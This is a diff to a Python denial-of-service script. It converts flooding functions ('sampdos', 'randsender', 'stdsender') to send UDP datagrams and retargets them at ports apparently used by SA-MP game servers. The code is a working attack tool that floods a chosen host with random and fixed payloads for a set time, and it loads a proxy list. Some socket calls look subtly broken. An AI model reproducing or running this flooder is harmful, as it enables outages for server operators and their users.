@@ -1,10 +1,8 @@
 import socket, struct, codecs, sys, threading, random, time, os, argparse
 
 proxys = open('proxy.txt').readlines()
-bots = len(proxys)
-iyos = open('ua.txt').readlines()
-uambot = len(iyos)
 
+bots = len(proxys)
 
 # // Argparse
 ap = argparse.ArgumentParser()
@@ -68,7 +66,7 @@ def sampdos(host, port, times):
 
         timeout = time.time() + float(times)
 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
         while time.time() < timeout:
 
@@ -80,27 +78,29 @@ def sampdos(host, port, times):
 
                 msg = Attack[random.randrange(0,3)]
 
-                sock.send(pack, (host, int(port)))
+                sock.sendto(pack, (host, int(port)))
 
-                sock.send(packet, (host, int(port)))
+                sock.sendto(packet, (host, int(port)))
 
-                sock.send(msg, (host, int(port)))
+                sock.sendto(msg, (host, int(port)))
 
-                sock.send(packets, (host, int(port)))
+                sock.sendto(packets, (host, int(port)))
 
-                if int(port) == 443:
+                if int(port) == 7777:
 
-                        sock.send(Attack[5], (host, int(port)))
+                        sock.sendto(Attack[5], (host, int(port)))
 
-                elif int(port) == 22:
+                elif int(port) == 7796:
 
-                        sock.send(Attack[4], (host, int(port)))
+                        sock.sendto(Attack[4], (host, int(port)))
 
-                elif int(port) == 80:
+                elif int(port) == 7771:
 
-                        sock.send(Attack[6], (host, int(port)))
+                        sock.sendto(Attack[6], (host, int(port)))
 
-                
+                elif int(port) == 7784:
+
+                        sock.sendto(Attack[7], (host, int(port)))
 
 
 
@@ -108,17 +108,17 @@ def randsender(host, port, times):
 
         timeout = time.time() + float(times)
 
-        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
+        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
 
         punch = random._urandom(int(1024))
 
         while time.time() < timeout:
 
-                sock.send(punch, (host, int(port)))
+                sock.sendto(punch, (host, int(port)))
 
-                sock.send(punch, (host, int(port)))
+                sock.sendto(punch, (host, int(port)))
 
-                sock.send(punch, (host, int(port)))
+                sock.sendto(punch, (host, int(port)))
 
 
 
@@ -128,22 +128,21 @@ def stdsender(host, times):
 
         timeout = time.time() + float(times)
 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
         payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
-     
 
         port = '3389'
 
         while time.time() < timeout:
 
-                sock.send(payload, (host, int(port)))
+                sock.sendto(payload, (host, int(port)))
 
-                sock.send(payload, (host, int(port)))
+                sock.sendto(payload, (host, int(port)))
 
-                sock.send(payload, (host, int(port)))
+                sock.sendto(payload, (host, int(port)))
 
 
 
